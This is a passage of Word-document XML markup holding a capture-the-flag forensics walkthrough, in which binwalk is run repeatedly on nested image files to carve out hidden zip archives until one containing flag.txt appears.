        <w:t xml:space="preserve"> x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1104</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-bit/color RGBA, non-interlaced </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>3226</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0xC9A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> TIFF image data, big-endian, offset of first image </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>directory:</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8</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272492</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0x4286C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Zip archive data, at least v2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> to extract, 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378955</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">, uncompressed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>size:</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383936</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>name:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>2_</w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>c.jpg</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651613</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0x9F15D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> End of Zip archive, footer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>length:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE54DA7" w14:textId="43E0D53C" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B085BE8"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 xml:space="preserve"># cd </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABA9B5C"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3E70E95" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>2_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1227552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highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> -e 2_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F99527" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46DBBB8E"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76B70DE0" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679C3BAA" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 526 x 1106, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA9DB2C"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624A0ED5"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187707        0x2DD3B         Zip archive data, at least v2.0 to extract, compressed size: 196045, uncompressed size: 201447, name: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>/3_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E27F84A" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>383807        0x5DB3F         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6D12D6" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>383918        0x5DBAE         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6978816B" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F09D271"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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DB1A75" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>2_c.jpg  _2_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E92D970" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>root@kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>:~/Downloads/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>dolls.jpg.extracted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t># cd _2_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BD6F1B"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 cd </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235C47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2634F01D" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>3_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EC4F57"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 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> -e 3_c.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FACAF66" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED19A05"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0A0E93FA" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4F8F58" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 428 x 1104, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433B25A5"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4F1FFC63" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">123606        0x1E2D6         Zip archive data, at least v2.0 to extract, compressed size: 77653, uncompressed size: 79808, name: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/4_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19224CD1" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>201425        0x312D1         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E9A226" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44FE7CCC"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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720674A6" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>3_c.jpg  _3_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB5FCA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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA9EEA0" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>bash: cd: _3: No such file or directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E34623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 cd _3_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA9B09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 ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE7DF40" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">1E2D6.zip  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5C6C9103" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted# cd </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>base_images</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C03F62F"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4F083799" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0949D036" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> -e 4_c.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC5631C" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02780B8F" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>DECIMAL       HEXADECIMAL     DESCRIPTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52600D18" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E328A3" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 320 x 768, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9ADAAB" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>3226          0xC9A           TIFF image data, big-endian, offset of first image directory: 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C3A9B7" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>79578         0x136DA         Zip archive data, at least v2.0 to extract, compressed size: 64, uncompressed size: 81, name: flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5291EC" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
